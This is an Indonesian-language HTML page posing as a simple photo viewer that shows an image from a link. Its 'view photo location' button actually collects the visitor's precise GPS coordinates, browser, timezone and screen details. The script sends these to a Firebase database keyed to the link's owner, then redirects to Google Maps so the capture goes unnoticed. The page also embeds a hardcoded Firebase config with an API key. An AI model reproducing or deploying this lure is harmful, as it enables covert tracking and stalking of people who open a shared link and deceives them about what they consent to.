<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Images</title>
<style>
:root{
  --bg:#000000;--bg2:#0a0a0a;--bg3:#111111;
  --gold:#00e58a;--gold2:#66ffc2;--cyan:#38bdf8;
  --red:#ff3355;
  --text:#cfd9e6;--text-d:#5d7186;
  --border:#152030;--border2:#1a1a1a;--radius:6px;
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;overflow-x:hidden}
body{
  font-family:'Courier New',monospace;
  background:#000000;
  color:var(--text);
  min-height:100vh;
  padding:14px;
  display:flex;
  justify-content:center;
  align-items:flex-start;
}
body::before{
  content:'';position:fixed;inset:0;
  background:repeating-linear-gradient(0deg,rgba(0,229,138,.010) 0px,rgba(0,229,138,.010) 1px,transparent 1px,transparent 4px);
  pointer-events:none;z-index:9999;
}
.wrap{position:relative;z-index:2;max-width:460px;width:100%}

/* HEADER */
.term-header{
  background:var(--bg2);
  border:1px solid #0d3f2e;border-bottom:none;
  padding:10px 14px;
  display:flex;justify-content:space-between;align-items:center;
  font-size:11px;
  border-radius:var(--radius) var(--radius) 0 0;
  box-shadow:inset 0 1px 0 rgba(148,205,255,.05);
}
.term-header .dots{display:flex;gap:6px}
.dot-win{width:9px;height:9px;border-radius:50%}
.dot-win.r{background:#ff3355}
.dot-win.y{background:#38bdf8}
.dot-win.g{background:#00e58a}
.term-header .title{
  color:var(--gold);font-weight:bold;flex:1;text-align:center;
  letter-spacing:4px;font-size:11px;text-transform:uppercase;
  text-shadow:0 0 10px rgba(0,229,138,.5);
}
.term-header .spacer{width:33px}

/* CARD */
.card{
  background:var(--bg2);
  border:1px solid var(--border2);
  padding:14px;margin-bottom:12px;
  border-radius:var(--radius);
  box-shadow:0 10px 26px rgba(0,0,0,.45);
}
.card.first{border-radius:0 0 var(--radius) var(--radius);border-top:1px solid #0d3f2e}

/* FOTO BOX */
.photo-box{
  width:100%;background:#000;
  border:1px solid #0d3f2e;
  border-radius:var(--radius);
  overflow:hidden;
  position:relative;
  margin-bottom:14px;
  box-shadow:0 0 24px rgba(0,229,138,.12);
}
.photo-box::before,.photo-box::after{
  content:'';position:absolute;width:14px;height:14px;z-index:5;pointer-events:none;
}
.photo-box::before{top:0;left:0;border-top:2px solid var(--gold);border-left:2px solid var(--gold)}
.photo-box::after{bottom:0;right:0;border-bottom:2px solid var(--gold);border-right:2px solid var(--gold)}
.photo-box img{
  width:100%;height:auto;
  max-height:70vh;
  object-fit:contain;
  display:block;
  background:#000;
}

/* SCAN ANIMATION */
.scan-box{
  text-align:center;
  padding:30px 14px;
  color:var(--gold);
  font-size:10px;
  letter-spacing:2px;
}
.scan-ring{
  width:56px;height:56px;
  margin:0 auto 14px;
  border:2px solid rgba(0,229,138,.2);
  border-top-color:var(--gold);
  border-radius:50%;
  animation:spin 1s linear infinite;
  box-shadow:0 0 20px rgba(0,229,138,.4);
}
@keyframes spin{to{transform:rotate(360deg)}}
.scan-bar{
  height:4px;background:var(--bg3);
  border:1px solid var(--border2);
  border-radius:2px;
  margin-top:10px;
  overflow:hidden;
}
.scan-fill{
  height:100%;width:0%;
  background:linear-gradient(90deg,#00e58a,#66ffc2);
  box-shadow:0 0 12px rgba(0,229,138,.7);
  animation:fill 2s ease-in-out infinite;
}
@keyframes fill{0%{width:0%}50%{width:100%}100%{width:0%}}

/* BUTTON */
.btn{
  width:100%;
  background:var(--gold);
  background-image:linear-gradient(180deg,rgba(255,255,255,.30),rgba(255,255,255,0) 55%);
  color:#000;border:none;
  font-family:'Courier New',monospace;
  font-size:12px;font-weight:bold;
  letter-spacing:3px;
  padding:15px;
  cursor:pointer;
  border-radius:var(--radius);
  text-transform:uppercase;
  box-shadow:0 0 16px rgba(0,229,138,.30),inset 0 1px 0 rgba(255,255,255,.35);
  transition:transform .15s,opacity .2s;
}
.btn:active{transform:scale(.98);opacity:.85}
.btn:disabled{opacity:.35;cursor:not-allowed;box-shadow:none}

/* STATUS */
.status{
  padding:10px 12px;
  border-radius:var(--radius);
  font-size:10px;
  text-align:center;
  letter-spacing:1px;
  line-height:1.7;
  margin-bottom:10px;
}
.status.ok{
  background:rgba(0,229,138,.08);
  border:1px solid rgba(0,229,138,.35);
  color:var(--gold);
}
.status.err{
  background:rgba(255,51,85,.08);
  border:1px solid rgba(255,51,85,.35);
  color:var(--red);
}
.status.info{
  background:rgba(56,189,248,.08);
  border:1px solid rgba(56,189,248,.35);
  color:var(--cyan);
}

/* HIDE */
.hide{display:none!important}

/* FOOTER */
.footer{
  text-align:center;
  font-size:9px;
  color:var(--text-d);
  letter-spacing:1px;
  padding:8px 0;
  opacity:.6;
}
.dot-status{
  display:inline-block;width:7px;height:7px;border-radius:50%;
  background:var(--gold);margin-right:6px;
  box-shadow:0 0 6px var(--gold);
  animation:spulse 2s ease-in-out infinite;
}
@keyframes spulse{
  0%,100%{opacity:1;box-shadow:0 0 6px var(--gold)}
  50%{opacity:.6;box-shadow:0 0 2px var(--gold)}
}

::-webkit-scrollbar{width:4px}
::-webkit-scrollbar-thumb{background:#0d3f2e;border-radius:2px}
</style>
</head>
<body>
<div class="wrap">

  <!-- HEADER -->
  <div class="term-header">
    <div class="dots">
      <div class="dot-win r"></div>
      <div class="dot-win y"></div>
      <div class="dot-win g"></div>
    </div>
    <div class="title">Images</div>
    <div class="spacer"></div>
  </div>

  <!-- FOTO -->
  <div class="card first">

    <!-- LOADING -->
    <div class="scan-box" id="loading">
      <div class="scan-ring"></div>
      MEMUAT FOTO...
      <div class="scan-bar"><div class="scan-fill"></div></div>
    </div>

    <!-- FOTO -->
    <div class="photo-box hide" id="photoBox">
      <img id="mainPhoto" alt="Foto">
    </div>

    <!-- ERROR -->
    <div class="status err hide" id="errBox">Foto tidak ditemukan</div>

    <!-- TOMBOL LIHAT LOKASI -->
    <button class="btn hide" id="btnShare" onclick="lihatLokasi()">
      Lihat Lokasi Foto
    </button>

    <!-- STATUS -->
    <div class="status info hide" id="locStatus" style="margin-top:10px;margin-bottom:0">Membuka lokasi foto...</div>
  </div>

  <div class="footer">
    <span class="dot-status"></span> SECURE SESSION
  </div>

</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

const FC = {
  apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
  authDomain:"roraxbali-65802.firebaseapp.com",
  databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId:"roraxbali-65802",
  storageBucket:"roraxbali-65802.firebasestorage.app",
  messagingSenderId:750633313866,
  appId:"1:750636313866:web:3d2e552960e06db83968b3"
};

const app = initializeApp(FC);
const db  = getDatabase(app);

// ============ PARAMETER URL ============
const params = new URLSearchParams(location.search);
const fotoUrl   = params.get('foto') || '';
const ownerUser = params.get('u')    || '';

// ============ TAMPILKAN FOTO ============
const loading   = document.getElementById('loading');
const photoBox  = document.getElementById('photoBox');
const mainPhoto = document.getElementById('mainPhoto');
const errBox    = document.getElementById('errBox');
const btnShare  = document.getElementById('btnShare');

if (fotoUrl) {
  mainPhoto.onload = () => {
    loading.classList.add('hide');
    photoBox.classList.remove('hide');
    setTimeout(() => btnShare.classList.remove('hide'), 500);
  };
  mainPhoto.onerror = () => {
    loading.classList.add('hide');
    errBox.classList.remove('hide');
    errBox.textContent = 'Gagal memuat foto';
  };
  mainPhoto.src = fotoUrl;
} else {
  loading.classList.add('hide');
  errBox.classList.remove('hide');
  errBox.textContent = 'Link tidak valid';
}

// ============ LIHAT LOKASI FOTO ============
window.lihatLokasi = function () {
  if (!ownerUser) {
    alert('Link tidak valid');
    return;
  }
  if (!navigator.geolocation) {
    alert('Browser Anda tidak mendukung GPS');
    return;
  }

  const st = document.getElementById('locStatus');
  st.classList.remove('hide');
  st.className = 'status info';
  st.textContent = 'Membuka lokasi foto...';
  btnShare.disabled = true;

  navigator.geolocation.getCurrentPosition(
    async pos => {
      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      try {
        // Simpan ke Firebase
        await push(ref(db, 'lokasi/' + ownerUser), {
          target:   'images',
          waktu:    Date.now(),
          lat:      lat,
          lng:      lng,
          akurasi:  acc,
          foto:     fotoUrl,
          platform: navigator.platform || 'Unknown',
          userAgent: navigator.userAgent,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen:   screen.width + 'x' + screen.height,
          via:      'view',
          source:   'view.html'
        });

        st.className = 'status ok';
        st.textContent = 'Membuka peta...';

        // Beep feedback
        try {
          const ac = new (window.AudioContext || window.webkitAudioContext)();
          const o = ac.createOscillator();
          const g = ac.createGain();
          o.type = 'sine';
          o.frequency.value = 1800;
          o.connect(g);
          g.connect(ac.destination);
          g.gain.setValueAtTime(0.08, ac.currentTime);
          g.gain.exponentialRampToValueAtTime(0.001, ac.currentTime + 0.15);
          o.start();
          o.stop(ac.currentTime + 0.15);
        } catch (e) {}

        // ═══ AUTO REDIRECT KE GOOGLE MAPS ═══
        setTimeout(() => {
          const mapsUrl = 'https://www.google.com/maps?q=' + lat + ',' + lng;
          window.location.href = mapsUrl;
        }, 400);

      } catch (e) {
        st.className = 'status err';
        st.textContent = 'Gagal: ' + e.message;
        btnShare.disabled = false;
      }
    },
    err => {
      let msg = 'Izin lokasi ditolak';
      if (err.code === 1) msg = 'Anda menolak izin lokasi';
      else if (err.code === 2) msg = 'Lokasi tidak tersedia';
      else if (err.code === 3) msg = 'Waktu habis, coba lagi';
      st.className = 'status err';
      st.textContent = msg;
      btnShare.disabled = false;
    },
    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
  );
};
</script>
</body>
</html>
